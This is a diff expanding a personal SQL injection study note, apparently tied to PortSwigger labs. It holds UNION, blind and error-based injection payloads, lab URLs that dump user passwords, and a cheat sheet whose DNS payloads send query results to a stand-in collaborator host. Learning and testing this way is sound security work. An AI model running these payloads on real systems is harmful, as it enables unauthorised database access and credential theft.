@@ -1,4 +1,4 @@
-## SQL Injection Attacks
+# SQL Injection Attacks
 
 SQLi vulnerabilities enable attackers to meddle with SQL queries exchanged between the web application and database. SQL vulnerabilities typically allow the attacker to extend the original application query to include database tables that would normally be inaccessible.
 
@@ -15,23 +15,156 @@ $result = mysqli_query($con, $sql_query);
 
 When testing a web application, we sometimes lack prior knowledge of the underlying database system, so we should be prepared to interact with different SQL database variants. The most common variants are MySQL and Microsoft SQL Server (MSSQL).
 
+Learning Resource: https://portswigger.net/web-security/learning-paths/sql-injection/
+
+## Types
+
 **In-band**: You use the same communication channel to both launch an attack and receive feedback from the backend. 
+
 - **Error-based**: Forces the database into generating an error, giving the attacker information upon which to refine the payload.
+
 - **Union**: Leverages the UNION SQL operater to combine the results of two queries into a single result set
+
 **Inferential (Blind)**: You don't receive feedback.
+
 - **Boolean-based**: Uses boolean conditions to return a different result depending on whether the query returns a true or false result
 ```bash
 select title from product where id =1 and 1=2
 ```
-```bash
 Payload:
+```bash
 www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
 ```
 Check if the first character in the password is an 's' (if nothing is returned on the page it's false). You can iterate through the password. Automate this.
 - **Time-based**: Relies on th e database pausting for a specified amount of time before returning the results
-**Out-of-band**: Unable to use the same channel as the db; unable to make a connection.
+**Out-of-band**: Unable to use the same channel as the db; unable to make a connection. Consists of triggering an out-of-band network connection to a system that you control.
+- Not common, a variety of protocols can be used (ex. DNS, HTTP)
+- Database specific, can be used to exfil data
 
-#### MySQL
+
+## How to Find
+
+**Black-Box**
+
+- Map the application, it's logic, directories, input vectors, domains, pages, while Burp Proxy is intercepting traffic
+
+- Fuzz the application: see how the application responds in unusual ways to special characters, and then refine the fuzzing. Submit boolean conditions such as 'OR 1=1', 'OR 1=2' and see how it responds. Do the same with time delays. Submit OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor for any resulting interactions.
+
+**White-Box**
+
+- **Enable web server logging**: helps when fuzzing the application to receive the errors occuring, and helps refine the payload. 
+
+- **Enable database logging**: seeing how it was logged at the backend will allow you to see which characters made it through and how they made it through
+
+- **Map the application**: Visible functionality in the application. Regex search on all instances in the code that talk to the database. 
+
+- **Code Review**: Follow the code path for all input vectors, walk down the functionality
+
+- **Test**
+
+Alternatively, you can find the majority of SQL injection vulnerabilities quickly and reliably using Burp Scanner. 
+
+## How to Exploit
+
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+
+- The type and version of the database software.
+- The tables and columns that the database contains.
+
+### Error-based: 
+- Submit SQL-specific characters such as ' or ", and look for errors or other anomolies
+- Different characters can give you different errors
+
+### Union:
+- *The number and the order of the columns must be the same in all queries & the data types must be compatible*
+
+- Figure out he number of columns that the query is making
+
+- Figure out the data types of the columns (mainly interested in string data), and whether the columns from the original query are of a suitable data type to hold the results from the injected query
+
+- Use the UNION operator to output information from the database
+
+**ORDER BY**: Used to determine the number of columns required in a SQL injection UNION attack
+
+- incrementally inject a series of ORDER BY caluses until you get an error or observe a different behaviour in the application; may just return a db error in its http response, or return no error at all
+
+```bash
+select title, cost from product where id =1 order by 1
+```
+
+**NULL**: Another way to determine the number of columns required
+- Incrementally inject a series of UNION SELECT payloads specifying a different number of null values until you no longer get an error
+
+```bash
+select title, cost from product where id =1 UNION SELECT NULL--
+select title, cost from product where id =1 UNION SELECT NULL, NULL--
+```
+
+- If NULL & NULL, NULL returns an error the number of columns is greater than two; may just return a db error in its http response, or return no error at all
+
+- When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column
+
+- The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException.
+
+- In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective. 
+
+Finding columns with a useful data type in a SQL injection UNION attack:
+
+- Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn
+
+```bash
+# Assumes there are 3 columns
+' UNION SELECT 'a', NULL, NULL--
+
+Conversion failed when converting the varchar 'a' to data type int.
+
+' UNION SELECT NULL,'a', NULL--
+...
+```
+
+If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data. 
+
+**Boolean-based**
+
+- First, submit a boolean condition that evaluates to False and not the response
+
+- Then, submit a boolean condition that evaluates to True and not the response
+
+- If the two above responses are different, then you have a boolean-based blind boolean statement.
+
+- You can later check the boolean responses against the above responses to test for true or false
+
+**Time-based**
+
+- Just like boolean based, but inspect for whether the time delay is the same or not with conditions
+
+Solutions:
+
+```bash
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+https://0ae7005c.web-security-academy.net/filter?category=Food%27+OR+1=1--
+# in the url
+
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+administrator'-- 
+# in the username input section
+
+https://0a5f008503774e3285381ed3000900ef.web-security-academy.net/filter?category=Accessories%27UNION%20SELECT%20NULL,%20NULL,%20NULL--
+# in the url to test for the number of columns
+#or 
+https://0a4f00bf03dfe32e8042d000006c0008.web-security-academy.net/filter?category=%27ORDER%20BY%204--
+
+
+https://0a4f00bf03dfe32e8042d000006c0008.web-security-academy.net/filter?category=%27UNION%20SELECT%20NULL,%20%27E2ioJx%27,%20NULL--
+
+https://0a6e00490459ba1a80eb5866000a0056.web-security-academy.net/filter?category='UNION SELECT username, password FROM users--
+# 2 column table named users, columns names are username and password
+
+https://0ae40036034b6b0d8575b95b0014005c.web-security-academy.net/filter?category=%27UNION%20SELECT%20NULL,%20username%20||%27~%27||%20password%20FROM%20users--
+# concatenated username and password with ~
+```
+
+### MySQL
 
 Using the mysql command, you can connect to the remote SQL instance by specifying root as username and password, along with the default MySQL server port 3306.
 ```bash
@@ -193,7 +326,7 @@ Let's craft a new query to dump the users table.
 ' UNION SELECT null, username, password, description, null FROM users -- //
 ```
 
-### Blink SQL Injections
+### Blind SQL Injections
 
 The SQLi payloads we have encountered are **in-band**, meaning we're able to retrieve the database content of our query inside the web application.
 
@@ -218,3 +351,172 @@ In this case, we appended an IF condition that will always be true inside the st
 This attack angle can clearly become very time consuming, so it's often automated with tools like sqlmap.
 
 **Initially pinpoint the parameter affected by the blind SQL injection through manual examination and only then pass this information to any automated tool such as SQLmap.**
+
+### Good to Know
+
+On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:
+
+```bash
+' UNION SELECT NULL FROM DUAL--
+```
+
+The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment. 
+
+## SQL Injection Cheat Sheet
+
+This SQL injection cheat sheet contains examples of useful syntax for a variety of tasks that often arise when performing SQL injection attacks.
+
+---
+
+### String Concatenation
+Concatenate multiple strings into a single string.
+
+- **Oracle**: `'foo'||'bar'`
+- **Microsoft**: `'foo'+'bar'`
+- **PostgreSQL**: `'foo'||'bar'`
+- **MySQL**: `'foo' 'bar'` [Note the space between the two strings] or `CONCAT('foo','bar')`
+
+---
+
+### Substring
+Extract part of a string from a specified offset with a specified length.
+
+- **Oracle**: `SUBSTR('foobar', 4, 2)`
+- **Microsoft**: `SUBSTRING('foobar', 4, 2)`
+- **PostgreSQL**: `SUBSTRING('foobar', 4, 2)`
+- **MySQL**: `SUBSTRING('foobar', 4, 2)`
+
+---
+
+### Comments
+Truncate a query with comments.
+
+- **Oracle**: `--comment`
+- **Microsoft**: `--comment` or `/*comment*/`
+- **PostgreSQL**: `--comment` or `/*comment*/`
+- **MySQL**: `#comment` or `-- comment` [Note the space after the double dash] or `/*comment*/`
+
+---
+
+### Database Version
+Query the database type and version.
+
+- **Oracle**: `SELECT banner FROM v$version; SELECT version FROM v$instance`
+- **Microsoft**: `SELECT @@version`
+- **PostgreSQL**: `SELECT version()`
+- **MySQL**: `SELECT @@version`
+
+---
+
+### Database Contents
+List tables and columns in the database.
+
+- **Oracle**: 
+  - `SELECT * FROM all_tables`
+  - `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
+- **Microsoft**: 
+  - `SELECT * FROM information_schema.tables`
+  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
+- **PostgreSQL**: 
+  - `SELECT * FROM information_schema.tables`
+  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
+- **MySQL**: 
+  - `SELECT * FROM information_schema.tables`
+  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
+
+---
+
+### Conditional Errors
+Test a boolean condition and trigger an error if true.
+
+- **Oracle**: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
+- **Microsoft**: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
+- **PostgreSQL**: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
+- **MySQL**: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`
+
+---
+
+### Extracting Data via Visible Error Messages
+Elicit error messages that leak data.
+
+- **Microsoft**: `SELECT 'foo' WHERE 1 = (SELECT 'secret')` 
+  > Conversion failed when converting the varchar value 'secret' to data type int.
+- **PostgreSQL**: `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` 
+  > invalid input syntax for integer: "secret"
+- **MySQL**: `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` 
+  > XPATH syntax error: '\secret'
+
+---
+
+### Batched (or Stacked) Queries
+Execute multiple queries in succession.
+
+- **Oracle**: Does not support batched queries.
+- **Microsoft**: `QUERY-1-HERE; QUERY-2-HERE` or `QUERY-1-HERE QUERY-2-HERE`
+- **PostgreSQL**: `QUERY-1-HERE; QUERY-2-HERE`
+- **MySQL**: `QUERY-1-HERE; QUERY-2-HERE`
+  - Note: With MySQL, batched queries are typically not used for SQL injection. Exceptions exist when the target application uses certain PHP or Python APIs with MySQL.
+
+---
+
+### Time Delays
+Cause a time delay when the query is processed.
+
+- **Oracle**: `dbms_pipe.receive_message(('a'),10)`
+- **Microsoft**: `WAITFOR DELAY '0:0:10'`
+- **PostgreSQL**: `SELECT pg_sleep(10)`
+- **MySQL**: `SELECT SLEEP(10)`
+
+---
+
+### Conditional Time Delays
+Test a boolean condition and trigger a time delay if true.
+
+- **Oracle**: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
+- **Microsoft**: `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
+
+
+- **PostgreSQL**: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
+- **MySQL**: `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`
+
+---
+
+### DNS Lookup
+Cause a DNS lookup to an external domain.
+
+- **Oracle**: 
+  - (XXE) vulnerability method: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
+  - Fully patched method (requires privileges): `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`
+- **Microsoft**: `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
+- **PostgreSQL**: `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
+- **MySQL** (Windows only): 
+  - `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`
+  - `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`
+
+---
+
+### DNS Lookup with Data Exfiltration
+Cause a DNS lookup with the results of an injected query.
+
+- **Oracle**: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
+- **Microsoft**: 
+  ```sql
+  declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);
+  exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+  ```
+- **PostgreSQL**: 
+  ```sql
+  create OR replace function f() returns void as $$
+  declare c text;
+  declare p text;
+  begin
+  SELECT into p (SELECT YOUR-QUERY-HERE);
+  c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+  execute c;
+  END;
+  $$ language plpgsql security definer;
+  SELECT f();
+  ```
+- **MySQL** (Windows only): `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`
+
+---
